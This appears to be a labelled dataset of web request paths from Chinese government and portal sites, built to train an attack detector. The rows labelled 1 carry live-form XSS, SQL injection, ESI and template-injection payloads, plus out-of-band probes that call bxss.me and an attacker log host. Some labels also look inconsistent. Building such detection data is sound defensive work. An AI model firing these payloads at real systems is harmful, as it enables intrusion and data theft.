request	label
/****/jtdt/2020_jtyw/202012/t20201201_264215.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(1019)"">?_=1630311691868"	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u0433\ufffd\ufffd\ufffd\u03f4\ufffd\u063b\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/*****/system/2020/10/14/javascript:window.print()	1
"/***/2019<esi:include src=""""http://bxss.me/rpb.png""""/>/11/15/art_390_182836.html"	1
/*****/system/2011/11/28/010551281_01.shtml	0
/****/gjdjbn/djbn_zyjh/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/0/01/95/50/1955003_775334.jpg	0
/****/\ufffd\u00b5\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u558a\u53eb\u6c34\u4e61\u5468\u7389\u6c5f\u7852\u7802\u74dc\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/tskmh/201903/ywly/gccb/xwzx/jtdt/rssdy/wzdt/qtyz/	0
/***/400/11/05/19/11051960_918118.jpg	1
/****/20210901/10399.html	0
"/****/openemr/?site="""">alert(777);"	1
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u96d5\u9f99\u753b\u6846\u7cbe\u7f8e\u88c5\u9970\u90e8	0
"/**/products/heavymachinery/201505/"""""	0
/*****/newspic/newspic010g/img_2348.jpg	0
"/******/web/messagebook/script/messagebook.js/<img src=""javascript:alert(5752)"">"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7fcc\u5f95\u987a\u4e94\u91d1\u673a\u7535\u7ecf\u9500\u90e8	0
/**/system/2019/10/16/011848601.shtml	0
/****/gjzqq/oz/bels/201412/w020141212417683818087.gif	0
/****/czgk/bmjs/qtdw/zzqzfgjjglb/202108/t20210812_2972651.html	0
/****/bmkx/sfgw/201901/w020190104597312585589.png	0
/****/b-e348629.html	0
/**********/system/2021/12/08/013491603.shtml	0
/****/	1
/****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/***/blockdata/getsearchinfo.do?&title=\u53cd\u72b9\u4e3b\u4e49	0
"/**/index.php?action=list&order=nan""/><script>alert(777);</script>me&srt=yes"	1
/******/visitcount/visit.jsp?i_columnid[1]==1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1080447799')))>'0&i_columnid[0]=exp&i_webid=1&type=1	1
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202007/t20200701_168701.html	0
/************/action/document/init/1472779430161043456-1472779430177820672-595?senior=undefined&_=1639972956085	0
/****/201806/t20180620_188343.html	0
/****/20210306/e117653062.html	0
/**********/system/2021/10/04/javascript:window.close();	1
/**********/system/2020/09/28/013256212.shtml	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(3668)</script>?_=1630311999630"	1
/*******/6801vd8.php	1
/****/bmkx/skjj/201610/t20161025_12104_wap.html	0
/**/viewspace-322.html	0
/**********/system/2020/05/04/013154233.shtml	0
/****/bmkx/sfgw/201610/t20161025_14207.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8fce\u6c34\u9547\u4f55\u6ce2\u670d\u88c5\u5e97	0
/*****/javascript/bootstrap/fonts/glyphicons-halflings-regular.woff	0
/****/bmkx/sjsj/201704/t20170420_89106.html	0
/****/category/silutouzi?page=1</script><script>z9xk(9673)</script>	1
/zwxx_11337/****/202111/t20211110_3121992.html/index_1.html	0
"/****/zfwjn/1088/1097/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(114).concat(68).concat(108).concat(70) (require""""socket""""
socket.gethostbyname(""""hitxe"""" """"ybglbiay9ddf2.bxss.me."""")[3].to_s) """""	1
/******/yjw2.pdf	0
/****/ilist.jsp?cat_id=2041	0
/***********/userservice.aspx?dbid=5' and 6022=6150 and 'ljlo'='ljlo	1
"/****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/**********/system/2021/12/04/013489900.shtml	0
/****/20211216/10904.html	0
/****/rn9gmz-article-e109059659.html	0
/****/bmkx/snmj/202005/w020200521328480914685.png	0
/****/201909/t20190926_1757867.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19105100240158490981_1640026150685	0
"/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&tpl=16&websiteid=110105008056111"	1
/****/xxgkml/qtfdxx/zcjd/qwjd/202101/t20210107_175859.html	0
/****/xqdt/hnx/202010/local	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e07\u5fb7\u946b\u5546\u5e97	0
/****/bmkx/jtysj/202008/t20200807_170928.html	0
/******/xxsjd/img2/7.jpg	0
/****/whhd/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/***/interface/comul_total.json.jsp?callback=jquery19109917872956464298_1640026059536	0
/zwxx_11337/****/202003/t20200316_1991015.html	0
/****/zfxxgk/zfxxgkzd_40887	0
/**/images/mbtn_menu.png	0
/***/app/homepage.z?perid=51216	1
/****/slide.aspx?id=1 and 1=1	1
"/****/search.jspx?q="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();""//"	1
"/cgi-bin/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/**********/system/2021/12/10/013492569.shtml	0
/****/qjrki6-hynews-e107237673.html	0
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/201802/w020180211350980449235.gif	0
/***/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/czgk/bmjs/zzqjcyxt/lwsrmjcy/201805/t20180524_765522.html	0
/****/thumb.php?src=<body onload=alert(777)>.jpg	1
/****/gccb/qgzfgc/	1
/zwxx_11337/****/index_11.html	0
/*******/qiye/b-e700681.html	0
/**/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
"/****/gjzqq/index.html?continent=') or 4417=4417 	1
/******/public/2020/10/10/99887.images/v99887_b1602314040367_app.jpg	0
/*****/newspic/newspic010g/img_2313.jpg	0
"/*********/*/-->'""""></iframe></script></style></title></textarea><script >alert(93696)</script>"	1
/****/system/2021/05/06/javascript:window.print()	1
/*****/20171020/3847.html	0
/*******/qiye/b-e2112652.html	0
"/****/libs/magpierss/scripts/magpie_simple.php?url=""""><img src= x onerror = alert(777)>url="""">"	1
"/**/""""<img src='http://attacker-9112/log.php?"	1
/****/gfxwj/201904/t20190410_1385028.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u9547\u6842\u5170\u5546\u5e97	0
/******/download/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc') and 6207=1636 and ('xtdt'='xtdt	1
/**/system/2021/01/15/javascript:void(0);	1
/******/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script>	1
/*******/huihua.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5cf0\u827a\u8fbe\u88c5\u9970\u8bbe\u8ba1\u5de5\u7a0b\u6709\u9650\u516c\u53f8	0
/zwxx_11337/****/201707/t20170727_301230.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u540c\u4f19\u6c47\u97f3\u4e50\u4f1a\u6240	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' or 3745=9377 /*&orderby=-docreltime&perpage=15&outlinepage=10	1
/**/system/2021/01/19/012116763.shtml	0
/**********/system/2020/05/20/013166204.shtml	0
/*******/202106/202106150949071019.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u8fdb\u90a6\u5546\u5e97	0
/***/0/01/26/07/1260704_146346.jpg	0
/*****/index/detail/art_id/222.html	0
/****/bmkx/slsj/201707/w020170707646389706531.jpg	0
/*********/treasury/index.aspx?nodeid=394);select sleep(5)	1
/************/bxss.me/jcse/110105008056111/16/images/jquery.waterfall.js	1
/****/b-e1179256.html	0
/******/uploadpic/image/20190603/1559545663795915.jpg	0
/****/zzxxgk/jjhzj/zsxw/202111/t20211108_196292.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5feb\u9012\u4e1a	0
/******/ew/20161024141306956.jpg	0
/******/system/2010/05/21/010127490.shtml	0
/****/category/fengxianjingshi?page=1 and 6534=6534--	1
/******/system/2014/07/07/011446443.shtml	0
/*/action%' and 2*3*8=6*8 and 'tv3o'!='tv3o%/showinfo/	1
/****/qzfwj/201806/t20180630_854361.html	0
/****/ccp_48498/zwhd/202112/t20211207_3206284.html	0
/******/system/2020/09/13/javascript:void(0);	1
/*******/qiye/b-e2046677.html	0
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new='.gethostbyname(lc('hitxc'.'avhyiehl84b67.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(107).chr(85).chr(106).chr(79).'	1
/****/bmkx/sgaj/201812/http://bxss.me/t/fit.txt?.jpg_112298.html	1
/if(now()=sysdate(),sleep(12),0)/****/znjs.htm	1
/*********/system/2010/07/21/010163649.shtml	0
/****/zsrc/goods.list.html?key=or 1=1 --	1
/****/kycg/kjjl/gjkj	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u56db\u5e73\u7231\u795e\u901a\u8baf\u90e8	0
/****/xxgkml/rsrm/201901/t20190102_113068.html	0
/****************/notification/negotiate?access_token=933a68be-948c-470d-b628-dd1175f14cda	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u9a6c\u6c38\u521a\u8f6e\u80ce\u7ecf\u9500\u90e8	0
/************/interfaces/dimension.do?cateid=1&eq=&oq=&p=if(now()=sysdate(),sleep(15),0)&pg=15&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &ranksign=&searchid=1&total=&tpl=16&websiteid=110105008056111	1
/****/rsrm/201506/w020170728621809719666.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5927\u901a\u5efa\u6750\u7ecf\u9500\u90e8	0
/****/ftl/common/menu/js/nav.js	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8f66\u53cb\u6c7d\u8f66\u88c5\u9970\u5e97	0
/****/20200930/e107717225.html	0
/**/system/2021/12/13/javascript:void(0);	1
/*******/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active	1
/************/search.do?'.gethostbyname(lc('hitaa'.'deaofosc0edb4.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(101).chr(81).chr(118).chr(89).'	1
/***/blockdata/getsearchinfo.do?&title=\u6cf0\u56fd\u653f\u5e9c	0
/****/zdlygk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/zzq/zcwj.htm	1
/****/zfgzbg/201801/t20180128_680859.html	0
/****/20211209/10876.html	0
"/****/bmkx/sfgw/201809/"""	0
/****/tusby/tcgy/	0
/**/system/2021/12/16/012230889.shtml	0
/***/0/01/73/57/1735730_998266.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d89\u5916\u7a0e\u52a1\u4ee3\u7406\u4e8b\u52a1\u6240	0
/***/0/01/39/89/1398957_881470.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u665f\u946b\u5510\u88c5\u9970\u6750\u6599\u7ecf\u9500\u90e8	0
/****/xxgkml/qtfdxx/zdjcyjzj/201909/t20190930_142742.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u55e8\u8fa3\u6d77\u9c9c\u574a	0
/****/yfyfwpt/gjjcxsdqy/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1600&h=1600&treeid=1012&refer=&pagename=l2luzm8uannw&newsid=2001	0
/****/form.jspx?id=javascript:window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()//&channelid=1542	1
"/***/col6/index.html"""" and """"x""""=""""y"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9686\u4ebf\u5efa\u8bbe\u5de5\u7a0b\u6709\u9650\u516c\u53f8	0
/**********/system/2021/11/10/013477923.shtml	0
/****/ and 1=1	1
/*******/ufk3z.php	1
/****/tzgg/tz17_6387/201811/t20181126_197777.html' and 'x'='y	1
/***/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/***/interface/daily_clickcount.json.jsp?callback=jquery1111047207533165340987_1639980673969	0
"/****/zzxxgk/tjj<esi:include src=""""http://bxss.me/rpb.png""""/>/zfxxgkml_2127/jytabljg_2061/list.html"	1
/****/qzfwj/201801/t20180115_668807.html	0
"/****/qzfwj/202012/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/kycg/kjjl/css/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/gy42/cpgyss.asp?key=\ufffd\u03fd\ufffd\ufffd40cr&showpage=1&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
"/**********/system/more/217000000000000'""""/><script >alert(1988);</script >/0045/217000000000000_00004535.shtml"	1
/**/viewspace-795.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' and 8589=8589 and '1'='1&wbfileid=51419	1
/****/lhy/ldhd	0
"/******/1/jquery.superslide.2.1.js/""><script>alert(6472)</script>"	1
/****/ilist.jsp?cat_id=26130	0
/****/202104/t20210402_272196.html	0
/****/zfwjn/1088/1110/http://bxss.me/t/fit.txt.html	1
/****/jtdt/jt16/201609/t20160920_102155.html	1
/***/interface/comul_total.json.jsp?callback=jquery191021260318742207307_1640034779373	0
/****/czgk/bmjs/gdyx/index_1.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsft/201908/t20190808_1656044.html	0
"/****/zdlygk/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/gys/jyx.htm"	1
/*******/201909/201909250859101013.html	0
/***/blockdata/getsearchinfo.do?&title=\u5806	0
/zwxx_11337/****/202007/t20200722_2170097.html	0
/****/zgsdt/2020_qydt/index_2.html	0
/zwxx_11337/****/202101/t20210111_2566657.html	0
/******/system/2011/09/29/010483081.shtml	0
/***/jiupan.php	1
/****/wdszs/hfsz/202006/t20200613_167962_wap.html	0
/**********/system/2021/01/22/013324070.shtml	0
/**********/system/2021/10/27/013471021.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b9c\u5b9d\u6e90\u8c46\u5236\u54c1\u52a0\u5de5\u5e97	0
/*************/ztsj/zt/msss/	0
/***/0/00/04/97/49799_044037.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u592a\u9633\u6881\u4e61\u767e\u5473\u9999\u5364\u8089\u5e97	0
/*****/system/2021/11/29/013487334.shtml	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u7965\u8018\u7855\u571f\u5730\u6d41\u8f6c\u670d\u52a1\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/bmkx/sgsj/202106/t20210607_183647.html	0
/****/czgk/bmyjs/zzqfyxt/qtxszjrmfy/201702/t20170208_318413.html	0
/**********/system/2021/04/07/013364849.shtml	0
/****/wdszs/hfsz/202103/t20210315_178609.html	0
/*****/df/	0
/****/sj1/tjxx/index_8.html	0
"/************/template'""""()&%<acx><script >vpin(9140)</script>/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js"	1
/****//828/j6u78dwl/xhr_send?t=1632366661108	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u7ea2\u658c\u9910\u5385	0
/****/web/search?channelid=299868&perpage=1000%') and 1660=9599 and '%'='	1
/**********/system/2021/10/02/javascript:void(0);	1
/******/usercenter/index?qrcode=20582	0
"/****/web/search?channelid=*/-->'""""></iframe></script></style></title></textarea><script >alert(31381)</script>&perpage=1000"	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u8f89\u7687\u4fe1\u606f\u90e8	0
/******/zwxxgk_bnt02b1.png	0
/_dwr/*********/if(now()=sysdate(),sleep(12),0).js	1
"/***/libs/magpierss/scripts/magpie_simple.php?url=""""><img src= x onerror = alert(777)>url="""">"	1
/****/gjjj/201903/t20190328_206040.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u65b0\u4e16\u5c4b\u670d\u88c5\u5e97	0
/****/xyfw/jcjg/sbjhhyzjzx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*/0w3f7k7z2/ecmsadmin.php	0
/**************/jianshe/dongtai	0
/***/viewspace-154.html	0
/******/hfjysj/202109/t20210908_186476.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9756\u7fd4\u5546\u5e97	0
/****/zgsdt/2014zgsdt/index_3.html	0
/zwxx_11337/****/zcjd/202003/t20200310_1985537.html	0
/******/rlzy/rcln/nbfw/rssdy/gjcp/hdzb/gjjtwzq/rssdy/ywly/jrytz/	0
/**********/rwgs/	0
/****/czgk/bmjs/sydw1/zfzshbsc/201808/t20180816_978008.html	0
/***/index.php?do=post&id=472&c=dt&a=goods&	1
"/************/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ "" and 2*3*8=6*8 and ""iyk7""=""iyk7&searchid=1&tpl=16&websiteid=110105008056111"	1
/*****/20211108/javascript:void(0);	1
/****/ysqgk/zzqzfzsjgzssydw/	0
/******/jslib%' and 2*3*8=6*8 and '4reb'!='4reb%/jquery/jquery.js	1
/*******/202104/202104151508301172.html	0
/****/xqdt/jtx/201610/t20161025_44137.html	0
/****/jtdt/2020_jtyw/202007/w020200701475538986250.jpg	0
/**/template.cfm?moduletitle=alert(777)	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u9ad8\u5d16\u4e61\u9999\u6c34\u9910\u5385	0
/****/login.html?status='</script><script>alert(777)</script>	1
/****/czgk/bmjs/zzqjcyxt/gysrmjcy/index_1.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtkmgofp2yqkg dsds4pmjiy=&openid=ovl7jjodzifre4pa8k5_4f-2at3u&outer_str=84578&activate_ticket=fdzv9emqaffrnr3xboqhbzag5bzk2swco7qasayiludhfifidrt1ejnprxbtx1zvgetfi6tpfanrmsfpbenvtuqn3wvc9rq32dqtsdmnreo=	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b89\u742a\u62c9\u4ea7\u540e\u751f\u6d3b\u9986	0
/**/xgzt/index.shtml	0
/************/template/jcse/110105008056111/16/images/plugin//xfs.bxss.me/hzrecorder.js	1
/****/xwygx/202112/kjcx/xyfw/bzhwyh/xwzx/mtgz/2021_mtgz/202103/t20210314_271326.html	0
/****/tzgg/202003/t20200304_1978986_zzb.html	0
/****/xxgkml/qtfdxx/zcjd/qwjd/201611/t20161111_72657.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9ed1\u4eae\u519c\u4e1a\u673a\u68b0\u7ecf\u9500\u4e13\u4e1a\u5408\u4f5c\u793e	0
/******/system/2021/03/04/javascript:window.close();	1
/****/yjh/ldhd/	0
/**********/system/2020/10/27/013271942.shtml	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u57ce\u80dc\u5a25\u5546\u5e97	0
/***********/jinrongqihuo/guzhiqihuo/index_0'xor(if(now()=sysdate(),sleep(9),0))xor'z.html	1
/**/system/2021/01/22/javascript:void(0);	1
/****/mtgz/2021_mtgz/202105/t20210505_273338.html and 1>1	1
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u590f\u53d4\u53d4\u9e21\u6392\u5e97	0
/****/web/search?channelid=206504	0
/****/web/index.jsp	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4f4f\u5b85	0
"/****/byysqgk/"""".gethostbyname(lc(""""hitkd"""".""""ptysbdxm00bcb.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(118).chr(83).chr(97).chr(82).""""/list.html"	1
/****/mtgz/2012mtgz/201412/t20141218_44684.html	0
/******/system/2016/09/19/012135409.shtml	0
/******/xxsjd/bmxx/	0
/******/visitcount/visit.jsp?i_columnid[0]=exp'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1503843923')))>'0&i_columnid[1]==1&i_webid=1&type=1	1
/****/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52069475662&token=&url=a&{/dede:field}=	1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/202112/w020211206439799286730.png	0
/***********/tuanduijieshao/javascript:void(0)	1
/****/tzgg/2021_tzgg/202112/t20211201_322580.html	0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zfzfjbsc/201802/t20180223_693384.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u97e6\u5dde\u9547\u9e3f\u8fd0\u6c7d\u8f66\u88c5\u6f62\u90e8	0
/****/\ufffd\u03f2\ufffd	0
/****/jjgz/202009/t20200922_253814.html and 1=1	1
/zwxx_11337/****/201904/w020190425320051624883.jpg	0
/*******/qiye/b-e2009992.html	0
/**********/system/2020/04/23/013147188.shtml	0
/*****/system/2021/07/30/javascript:void(0);	1
/***/public.cgi	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9ad8\u5fe0\u5fb7\u8d27\u8fd0\u90e8	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtflf pt8mr0zwwlw6wmm6j8=&openid=ovl7jjsvk1f5eht9cmbvrg4zyudm&outer_str=2048&activate_ticket=fdzv9emqaffrnr3xboqhbzidu1jajwd4l/fol7wxf/xhfifidrt1ejnprxbtx1zv8xv1zudbua7cfg4azqybhrdh6e9z5wbyneoa2t7bnoe=	0
/*************/zwgk/czgk/bmjs/rmtt/fxh/	0
/hire_prd/*****/index.html?hireid=mtawnjkzodg=&hire_class=b&type=1&recruit_type=1	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u71d5\u5b50\u7a97\u5e18\u5e97	0
/**********/system/2020/05/28/013172772.shtml	0
"/****/zzxxgk/tjj/"""".gethostbyname(lc(""""hitrd"""".""""ugalzlcu31f2d.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(118).chr(69).chr(111).chr(67).""""_2127/jgzn_2042/list.html"	1
/**********/index_if(now()=sysdate(),sleep(6),0).html	1
/*****/gy48/ljcpgyview.asp?id=42567501&l=\ufffd\ufffd\ufffd	0
/****/gjzqq/ and 1=1	1
/******/20190913.jpg	0
/*****/gy42/cpgyss.asp?key=\u0562\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/jsxmhjyx/hjyxpf/201912/t20191201_144981.html	0
/*******/qiye/b-e2515977.html	0
/****/xh/hd/201705/w020170728435206728406.jpg	0
/****/system/2017/06/02/javascript:dozoom(12)	1
/*****/system/2021/11/08/javascript:window.print()	1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201808/t20180810_162710.html	0
/****/xqdt/byq/201806/t20180611_104313.html	0
"/******/5/' 'a'.concat(70-3).concat(22*4).concat(105).concat(72).concat(114).concat(74) (require'socket'
socket.gethostbyname('hitiu' 'mamkopeacf969.bxss.me.')[3].to_s) '.js"	1
"/**/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/******/system/2018/01/18/javascript:void();	1
/*********/treasury/index.aspx?nodeid=394 and 4446=(select 4446 from pg_sleep(5))	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5409\u7965\u7efc\u5408\u95e8\u5e02\u90e8	0
/***********/zaojianpinglun/?_=1640035355407	0
/*******/qiye/20211127/e142582784.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u627f\u777f\u5b89\u5efa\u7b51\u5de5\u7a0b\u6709\u9650\u516c\u53f8	0
/********/ywly/gccb/txgc/gjcp/nyjx/bqsm/yqlj/kjcx/qyzz/images/jianfan.js	0
"/************/template/jcse'""""()&%<acx><script >xiko(9450)</script>/110105008056111/16/images/condition.js"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5434\u5fe0\u9762\u6761\u5e97	0
/***/0/11/40/99/11409965_483159.jpg	0
/****/czgk/bmyjs/zzqjcyxt/ycsrmjcy/202103/p020210309355027336434.pdf	0
"/***/http://bxss.me/t/xss.html?	1
/****/czgk/bmyjs/rmtt/fxh/201903/t20190305_1297874.html	0
"/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqdwbgt/202008/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u946b\u65f6\u5c1a\u88c5\u9970\u6750\u6599\u7ecf\u9500\u90e8	0
/******/system/2021/04/08/013365647.shtml	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtahplnrqnmlfe/krtrp6dog=&openid=ovl7jjvzy2bel-js3dvf3pcvnjrc&outer_str=1689&activate_ticket=fdzv9emqaffrnr3xboqhb7ugk4tmhrv0dcnzpamrlbpoo8dbj5 fzedtzplsmcarxvioeup9q6wjeq/7lecrlvpif2gxnfbtbytad16xh3m=	0
/*****/20211018/10590.html	0
/zwxx_11337/****/202004/t20200423_2045360.html	0
/*****/system/2013/11/04/011225280_02.shtml	0
/**********/system/2021/07/13/013418224.shtml	0
/******/usercenter/index?qrcode=5177	0
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u5168\u9f99\u7164\u70ad\u7ecf\u9500\u70b9	0
/****/czgk/bmjs/sydw1/zzqskylgbjdaj_1820/202108/t20210818_2978435.html	0
/****/system/2017/04/07/012281696.shtml	0
/*******/qiye/businesses-e42579_5.html?category_id=240764	0
/****/zgsdt/2021_qydt/202109/t20210913_315919.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 2129=2129 and '%'='	1
/*******/qiye/b-e1105462.html	0
/**/system/2021/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/2020jnxc/yxzp/202006/t20200630_249623.html	0
/*******/201909/201909191107251043.html	0
/******/user/gallery1.php?g_name=<script>alert(77729</script>	1
/****/zt/yqfkzccs/dsjzccs/ycszc/	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u6c5f\u6d9b\u8425\u517b\u65e9\u9910\u5e97	0
/**********/system/2020/05/25/013169262.shtml	0
/***/blockdata/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid°Ëtpage=&channelid=minsheng<alert(88952634)>	1
/zwxx_11337/****/201712/t20171207_627983.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0124\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/******/sbd/css/1.css	0
/************/account-opening-process/if(now()=sysdate(),sleep(6),0)-01-13/138.html	1
/***/0/01/91/75/1917596_738586.png	0
/**/co867p.html	0
/**********/system/2021/06/22/javascript:void(0);	1
"/****/bysw/202109/t20210918_186720.html?leader="""".gethostbyname(lc(""""hitqx"""".""""ejkuescoc60e5.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(110).chr(67).chr(97).chr(72)."""""	1
"/http://*******/t/xss.html?	1
/**********/system/2018/10/18/012721331.shtml	0
/****/xxgkml/qtfdxx/zdjcyjzj/202106/p020210616377882676073.docx	0
"/****/xxgkzd/list.html?new=0.8921938434089278<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/**/system/2021/12/09/javascript:void(0);	1
"/xxgk'""""()&%<acx><script >dwaj(9746)</script>/*****/1079/1081/list.html"	1
"/***/getallchannels?vno=3.5.0""and/**/extractvalue(1,concat(char(126),md5(1080097157)))and"""	1
"/****/group-summary.jsp?search=test"" onmouseover=alert(777) x="""	1
/****/dqgz/ and 1>1	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u848b\u8363\u6c7d\u8f66\u4fee\u7406\u90e8	0
/***/interface/comul_total.json.jsp?callback=jquery1710037564234413995035_1639979919910	0
